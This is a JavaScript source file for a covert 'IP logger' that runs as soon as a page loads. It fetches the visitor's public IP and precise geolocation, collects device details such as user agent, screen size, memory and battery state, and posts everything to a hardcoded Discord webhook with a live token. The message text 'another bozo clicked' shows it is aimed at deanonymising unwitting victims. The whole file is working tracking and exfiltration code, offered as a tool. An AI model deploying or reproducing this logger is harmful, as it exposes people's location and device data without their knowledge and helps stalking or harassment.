const sendIP = () => {
    // Fetch the public IP address
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            
            // Fetch geolocation data based on the IP
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    
                    // Gather device information
                    const deviceInfo = {
                        userAgent: navigator.userAgent,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        deviceMemory: navigator.deviceMemory || "N/A", // Available memory (GB)
                        language: navigator.language,
                        platform: navigator.platform,
                        battery: "N/A",  // Default to N/A
                        charging: "N/A", // Default to N/A
                        screenRefreshRate: "N/A", // Default to N/A
                        touchScreen: 'N/A',  // Default to N/A
                        gpu: "N/A", // Default to N/A
                    };
                    
                    // Get battery status if available
                    if (navigator.getBattery) {
                        navigator.getBattery().then(function(battery) {
                            deviceInfo.battery = battery.level * 100 + "%";
                            deviceInfo.charging = battery.charging ? "Yes" : "No";
                        });
                    }
                    
                    // Try to get the screen refresh rate
                    if (window.screen && window.screen.refreshRate) {
                        deviceInfo.screenRefreshRate = window.screen.refreshRate + "Hz";
                    }

                    // Detect if the device has a touch screen
                    deviceInfo.touchScreen = ('ontouchstart' in window) ? 'Yes' : 'No';

                    // Example for a more detailed GPU (This part may not work in all browsers)
                    const getGPUInfo = () => {
                        if (navigator.hardwareConcurrency) {
                            deviceInfo.gpu = `Logical CPU cores: ${navigator.hardwareConcurrency}`;
                        }
                    };
                    getGPUInfo();
                    
                    // Discord Webhook URL
                    const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
                    
                    // Send data to Discord Webhook
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "SCRIPTY IP LOGGER",
                            avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
                            content: `@here another bozo clicked`,
                            embeds: [
                                {
                                    title: 'SCRIPTY IP LOGGER',
                                    description: `
                                        **IP Info:**\n
                                        IP Address >> ${ipadd}\n
                                        Network >>  ${geoData.network}\n
                                        City >>  ${geoData.city}\n
                                        Region >>  ${geoData.region}\n
                                        Country >>  ${geoData.country_name}\n
                                        Postal Code >>  ${geoData.postal}\n
                                        Latitude >>  ${geoData.latitude}\n
                                        Longitude >>  ${geoData.longitude}\n
                                        Timezone >>  ${geoData.timezone}\n
                                        ASN >>  ${geoData.asn}\n
                                        Organization >>  ${geoData.org}\n
                                        \n**Device Info:**\n
                                        User-Agent >>  ${deviceInfo.userAgent}\n
                                        Screen Width >>  ${deviceInfo.screenWidth}px\n
                                        Screen Height >>  ${deviceInfo.screenHeight}px\n
                                        Device Memory >>  ${deviceInfo.deviceMemory} GB\n
                                        Language >>  ${deviceInfo.language}\n
                                        Platform >>  ${deviceInfo.platform}\n
                                        Battery >>  ${deviceInfo.battery}\n
                                        Charging >>  ${deviceInfo.charging}\n
                                        Screen Refresh Rate >>  ${deviceInfo.screenRefreshRate}\n
                                        Touch Screen >>  ${deviceInfo.touchScreen}\n
                                        GPU >>  ${deviceInfo.gpu}`,
                                    color: 1752220
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
